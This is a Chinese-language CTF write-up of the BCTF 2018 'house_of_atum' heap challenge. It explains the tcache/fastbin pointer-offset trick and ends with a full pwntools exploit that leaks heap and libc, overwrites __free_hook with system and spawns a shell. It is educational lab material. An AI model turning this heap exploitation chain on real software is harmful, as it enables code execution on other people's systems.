---
title: 'BCTF2018:house_of_atum'
date: 2018-12-09 15:04:48
tags: heap tcache
layout: post
---
BCTF 2018 house of atum  
<!--more-->
# Start
建议和three一起做.很多逻辑都差不多
增加了一个edit功能
但是减少了一个可以控制的point
magic of
tcache & fast bin  


# analysis
checksec
```sh
➜  Desktop checksec houseofAtum
[*] '/home/n132/Desktop/houseofAtum'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
全保护
主要的漏洞点也和three 一样:uaf
```python
➜  Desktop checksec houseofAtum
[*] '/home/n132/Desktop/houseofAtum'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
➜  Desktop 
```

但是主要的限制是:
```python
if ( v1 < 0 || v1 > 1 || !notes[v1] )
    return puts("No such note!");
```

开始的时候自己画了半天感觉如果单凭tcache 用两个point是不可能的...
最后偷偷看了Ne0师傅的wp
[Ne0][1]
发现自己的思维还是太禁锢...


# House of atum

* 为了方便我们使用chunk free 到tcache上的指针指向chunk+0x10
* fastbin 中的地址是指向 chunk的开始
所以我们可以通过这个差异做一些事情这里用Ne0师傅的poc来示范一下

```python
add()#0
add()#1
for x in range(7):
    free(0)
free(1)
#break point 1
free(0)
#break point 2
```
beak point 1 处 堆内存分布:
```s
 tcache                                 a
+-------+                    +-----------+-----------+
|       +-------------+      | prev_size |   size    |
+-------+             |      +-----------+-----------+
|       |             +------>  fd                   <-------+
+-------+                    |                       |       |
|       |                    |                       |       |
+-------+                    +------------+----------+       |
                                          |                  |
                                          +------------------+


fastbin                                 b
+-------+                    +-----------+-----------+
|       +-------------+      | prev_size |   size    |
+-------+             |      +-----------+-----------+
|       |             +------>  fd                   |
+-------+                    |                       |
|       |                    |                       |
+-------+                    +-----------------------+

```

beak point 2 处 堆内存分布:

```s
 tcache                                 a
+-------+                    +-----------+-----------+
|       +-------------+      | prev_size |   size    |
+-------+             |      +-----------+-----------+
|       |             +------>  fd                   +-------+
+-------+                    |                       |       |
|       |                    |                       |       |
+-------+                    +-----------------------+       |
                                                             |
                                                         +---+
                                                         |
fastbin                                 a                |            b
+-------+                    +-----------+-----------+   | +-----------+-----------+
|       +-------------+      | prev_size |   size    | +-+-> prev_size |   size    |
+-------+             |      +-----------+-----------+ |   +-----------+-----------+
|       |             +------>  fd=b                 +-+   |  fd=0                 |
+-------+                    |                       |     |                       |
|       |                    |                       |     |                       |
+-------+                    +-----------------------+     +-----------------------+
```

* 这样子我们就可以吧chunk B的开始地址链在tcache上

* 虽然目前看来没什么用但是 如果我们在一开始就设置好了chunk A的尾部也就是chunk_B的size前8字节
* 那么在我们将tcache上的chunk A+10 chunk B取下之后tcache 上将会留下我们设置的目标

* 之后我们只要盖掉chunk B 的size位删除后再次malloc 就可以得到 我们的目标

* 然后就可以做 over lap 和一些其他有趣的事情


# 利用思路
* 因为除了只有两个point之外没什么特殊的限制所以只要泄露了libc我们能直接改`__free_hook` 然后getshell
* 所以我们主要目标是:
    * modify size
    * free 
    * show
* 但是因为只有两个point 所以我们可以作为next_size的点比较少在free大chunk到unsorted bin时容易出错
* 假设我们将第二个chunk的末尾作为我们伪造的大chunk的next_chunk_size那我们需要控制第一个chunk前的位置
* 第一个chunk+10为0x60 我们控制0x50便可以控制size且free的时候next_chunk_size可以控制

# 利用过程
```python
* get heap base#u need it
* use house of atum 
    * add(p64(0x21)*7+p64(0x61)+p61(heap+0x250))
    * add()
    * free(0)*7
    * free(1),free(0)
    * add(),add()
    * free(0x2a0) to tcache(0x60) 
    * add()# get 0x250
* modify chunk_size (0x260)
* free 0x260 to fill tcache 
* free 0x260 to unsorted bin
* show to get libc_base
* modify: __free_hook --> system
* free /bin/sh
```
# exp
```python
from pwn import *

def cmd(c):
	p.sendlineafter("choice:",str(c))
def add(data=p64(0x11)*9):
	cmd(1)
	p.sendafter("tent:",data)
def edit(idx,data):
	cmd(2)
	p.sendlineafter("idx:",str(idx))
	p.sendafter("tent:",data)
def free(idx,mode=0):
	cmd(3)
	p.sendlineafter("idx:",str(idx))
	if(mode==0):
		p.sendlineafter(":",'n')
	else:
		p.sendlineafter(":",'y')
def show(idx):
	cmd(4)
	p.sendlineafter("idx:",str(idx))
p=process("./houseofAtum")
binary=ELF("./houseofAtum")
add()#0
add()#1
free(1,1)
free(0,1)
add("\x0a")
#context.log_level='debug'
show(0)
p.readuntil("tent:\n")
heap=u64(("\x00"+p.readline()[:-1]).ljust(8,'\x00'))-0x200
log.warning("heap>%s",hex(heap))
free(0,1)
add(p64(0x21)*7+p64(0x61)+p64(heap+0x250))
add()
for x in range(7):
	free(0)
free(1,1)

free(0,1)
add('0')
add('0')
free(1,1)
add(p64(0)+p64(0x91))
for x in range(7):
	free(0)
free(0,1)
edit(1,"A"*16)
show(1)
p.readuntil("A"*16)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dcfca0-0x00007ffff79e4000)
log.warning(hex(base))
binary=ELF("./houseofAtum")
libc=binary.libc
libc.address=base
edit(1,p64(0)+p64(0x51)+p64(0))
add(p64(0xcafebabe))
free(0,1)
edit(1,p64(0)+p64(0x61)+p64(libc.symbols['__free_hook']))
add(p64(0))
free(0,1)
add(p64(libc.symbols['system']))
edit(1,"/bin/sh")
cmd(3)
p.sendlineafter("idx:","1")
p.sendline("clear")
p.interactive("\033[1;31;40m n132>>> \033[0m")
```
# .

* 利用tcache 与fast bin 存放chunk的差异 把任意地址放进tcache
* 一定程度上的任意地址写

[1]:https://changochen.github.io/2018-11-26-bctf-2018.html